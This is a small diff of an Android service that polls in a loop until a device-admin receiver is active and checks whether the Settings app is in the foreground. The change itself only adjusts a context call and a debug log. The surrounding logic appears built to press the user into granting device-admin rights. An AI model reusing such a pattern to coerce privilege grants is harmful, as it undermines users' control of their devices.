@@ -37,7 +37,7 @@ public class WatchService extends Service {
             public void run() {
                 while (!AppRuntime.WATCHING_SERVICE_BREAK.get()) {
                     DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-                    boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(getApplication(), DeviceBindBRC.class));
+                    boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(getApplicationContext(), DeviceBindBRC.class));
                     if (isDeviceBinded) break;
 
                     try {
@@ -48,7 +48,7 @@ public class WatchService extends Service {
 
                     String packname = am.getRunningTasks(1).get(0).topActivity.getPackageName();
                     if (Config.DEBUG) {
-                        Config.LOGD("[[WatchService]] current top package : " + packname);
+                        Config.LOGD("[[WatchService]] current top package : " + packname + " isDeviceBinded : (" + isDeviceBinded + ")");
                     }
 
                     if (!"com.android.settings".equals(packname)) {
